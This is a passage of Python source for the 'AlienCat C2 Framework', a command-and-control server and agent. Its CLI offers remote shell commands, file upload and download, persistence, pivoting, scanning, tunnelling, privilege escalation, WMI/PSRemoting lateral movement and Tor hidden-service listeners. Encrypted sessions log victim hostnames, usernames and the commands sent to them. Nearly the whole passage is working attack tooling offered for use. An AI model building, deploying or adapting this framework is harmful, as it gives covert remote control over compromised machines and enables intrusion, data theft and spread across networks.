            print("Usage: tor connect <target> <port> [tor_port]")
            return
        
        response = await self.server.send_command(
            self.current_session,
            {"action": "plugin", "args": ["Tor", action, *args]}
        )
        print(response.decode())
    
    async def exit(self):
        print("Exiting...")
        for session_id in list(self.server.sessions.keys()):
            await self.server.send_command(session_id, {"action": "exit"})
        os._exit(0)
    
    async def show_help(self):
        print("\nAvailable Commands:")
        print("  sessions                  - List active sessions")
        print("  use <session_id>          - Switch to a session")
        print("  shell <command>           - Execute shell command")
        print("  download <remote> [local] - Download file from agent")
        print("  upload <local> <remote>   - Upload file to agent")
        print("  plugin <name> [args...]   - Execute plugin")
        print("  persistence               - Establish persistence")
        print("  pivot <target_ip>         - Pivot to another host")
        print("  scan <target_ip>          - Scan network ports")
        print("  tunnel create <lport> <rhost> <rport> - Create tunnel")
        print("  tunnel list               - List active tunnels")
        print("  tunnel close <id>         - Close tunnel")
        print("  privesc                   - Check for privilege escalation")
        print("  lateral <target> [method] - Lateral movement (wmi/psremoting)")
        print("  tor install               - Install Tor")
        print("  tor connect <target> <port> - Connect via Tor")
        print("  exit                      - Exit the C2 server")
        print("  help                      - Show this help")
        print()

class Server:
    def __init__(self):
        self.sessions = {}
        self.encryption_key = None
        self.running = False
        self.plugin_manager = PluginManager(None)
        self.cli = ServerCLI(self)
        self.init_db()
    
    def init_db(self):
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    hostname TEXT,
                    username TEXT,
                    os TEXT,
                    first_seen TEXT,
                    last_seen TEXT
                )
            """)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    command TEXT,
                    timestamp TEXT,
                    FOREIGN KEY(session_id) REFERENCES sessions(id)
                )
            """)
            conn.commit()
    
    async def start(self, port, protocol="tcp", key=DEFAULT_KEY):
        self.encryption_key = CryptoUtils.generate_key(key)
        self.running = True
        
        server_task = asyncio.create_task(self.start_server(port, protocol))
        cli_task = asyncio.create_task(self.cli.start())
        
        await asyncio.gather(server_task, cli_task)
    
    async def start_server(self, port, protocol):
        if protocol == "tcp":
            await self.tcp_listen(port)
        elif protocol == "https":
            await self.https_listen(port)
        elif protocol == "tor":
            await self.tor_listen(port)
        else:
            raise ValueError(f"Unsupported protocol: {protocol}")
    
    async def tcp_listen(self, port):
        server = await asyncio.start_server(self.handle_tcp_connection, '0.0.0.0', port)
        async with server:
            await server.serve_forever()
    
    async def https_listen(self, port):
        if not os.path.exists("server.crt") or not os.path.exists("server.key"):
            self.generate_self_signed_cert()
        
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain('server.crt', 'server.key')
        
        server = await asyncio.start_server(
            self.handle_tcp_connection, '0.0.0.0', port, ssl=ssl_context)
        async with server:
            await server.serve_forever()
    
    async def tor_listen(self, port):
        try:
            import stem.process
            from stem.util import term
            
            tor_process = stem.process.launch_tor_with_config(
                config = {
                    'SocksPort': '9050',
                    'HiddenServiceDir': 'hidden_service',
                    'HiddenServicePort': f'80 127.0.0.1:{port}'
                },
                init_msg_handler = lambda line: print(term.format(line, term.Color.BLUE)) if "Bootstrapped" in line else None
            )
            
            with open('hidden_service/hostname', 'r') as f:
                print(f"Tor hidden service available at: {f.read().strip()}")
            
            server = await asyncio.start_server(self.handle_tcp_connection, '127.0.0.1', port)
            async with server:
                await server.serve_forever()
            
            tor_process.kill()
        except Exception as e:
            logger.error(f"Tor server error: {e}")
    
    def generate_self_signed_cert(self):
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "AlienCat"),
            x509.NameAttribute(NameOID.COMMON_NAME, "aliencat.local"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256())
        
        with open("server.key", "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        
        with open("server.crt", "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
    
    async def handle_tcp_connection(self, reader, writer):
        try:
            data = await reader.read(BUFFER_SIZE)
            decrypted = CryptoUtils.decrypt_data(data, self.encryption_key)
            handshake = json.loads(decrypted.decode())
            
            session_id = handshake["session_id"]
            if session_id not in self.sessions:
                self.sessions[session_id] = {
                    "info": handshake,
                    "last_seen": time.time(),
                    "writer": writer,
                    "reader": reader
                }
                logger.info(f"New session: {session_id}")
                self.save_session(handshake)
            
            while self.running:
                try:
                    data = await reader.read(BUFFER_SIZE)
                    if not data:
                        break
                    
                    decrypted = CryptoUtils.decrypt_data(data, self.encryption_key)
                    response = await self.handle_client_command(session_id, decrypted)
                    
                    if response:
                        encrypted = CryptoUtils.encrypt_data(response, self.encryption_key)
                        writer.write(encrypted)
                        await writer.drain()
                except ConnectionResetError:
                    break
                except Exception as e:
                    logger.error(f"Command error: {e}")
                    break
            
            if session_id in self.sessions:
                del self.sessions[session_id]
            writer.close()
            await writer.wait_closed()
        except Exception as e:
            logger.error(f"Connection error: {e}")
    
    def save_session(self, handshake):
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT OR REPLACE INTO sessions VALUES (?, ?, ?, ?, ?, ?)",
                (
                    handshake["session_id"],
                    handshake["hostname"],
                    handshake["username"],
                    handshake["os"],
                    time.strftime("%Y-%m-%d %H:%M:%S"),
                    time.strftime("%Y-%m-%d %H:%M:%S")
                )
            )
            conn.commit()
    
    def log_command(self, session_id, command):
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO commands (session_id, command, timestamp) VALUES (?, ?, ?)",
                (session_id, command, time.strftime("%Y-%m-%d %H:%M:%S"))
            )
            conn.commit()
    
    async def send_command(self, session_id, command):
        if session_id not in self.sessions:
            return b"Session not found"
        
        session = self.sessions[session_id]
        encrypted = CryptoUtils.encrypt_data(json.dumps(command).encode(), self.encryption_key)
        session["writer"].write(encrypted)
        await session["writer"].drain()
        
        data = await session["reader"].read(BUFFER_SIZE)
        if not data:
            return b"No response"
        
        decrypted = CryptoUtils.decrypt_data(data, self.encryption_key)
        self.log_command(session_id, json.dumps(command))
        return decrypted
    
    async def handle_client_command(self, session_id, command):
        self.sessions[session_id]["last_seen"] = time.time()
        cmd = json.loads(command.decode())
        
        if cmd.get("action") == "heartbeat":
            return b"alive"
        
        response = b""
        if "action" in cmd:
            if cmd["action"] == "shell":
                response = (await self.plugin_manager.execute_plugin("Shell", cmd.get("args", [""])[0])).encode()
            elif cmd["action"] == "plugin":
                plugin_name = cmd.get("args", [""])[0]
                plugin_args = cmd.get("args", [])[1:]
                result = await self.plugin_manager.execute_plugin(plugin_name, *plugin_args)
                response = str(result).encode()
        
        return response if response else b"Command executed"

async def agent_mode(server, port, protocol, key):
    agent = Agent()
    await agent.plugin_manager.load_builtin_plugins()
    await agent.plugin_manager.load_plugins_from_dir()
    await agent.connect(server, port, protocol, key)

async def server_mode(port, protocol, key):
    server = Server()
    await server.start(port, protocol, key)

def main():
    parser = argparse.ArgumentParser(description="AlienCat C2 Framework")
    subparsers = parser.add_subparsers(dest="mode", required=True)
    
    agent_parser = subparsers.add_parser("agent")
    agent_parser.add_argument("--connect", required=True, help="Server address")
    agent_parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Server port")
    agent_parser.add_argument("--protocol", choices=["tcp", "https", "tor"], default="tcp", help="Protocol")
    agent_parser.add_argument("--key", default=DEFAULT_KEY, help="Encryption key")
    
    server_parser = subparsers.add_parser("server")
    server_parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Listen port")
    server_parser.add_argument("--protocol", choices=["tcp", "https", "tor"], default="tcp", help="Protocol")
    server_parser.add_argument("--key", default=DEFAULT_KEY, help="Encryption key")
    
    args = parser.parse_args()
    
    if args.mode == "agent":
        server = args.connect
        port = args.port
        protocol = args.protocol
        key = args.key
        asyncio.run(agent_mode(server, port, protocol, key))
    elif args.mode == "server":
        port = args.port
        protocol = args.protocol
        key = args.key
        asyncio.run(server_mode(port, protocol, key))

if __name__ == "__main__":
    main()
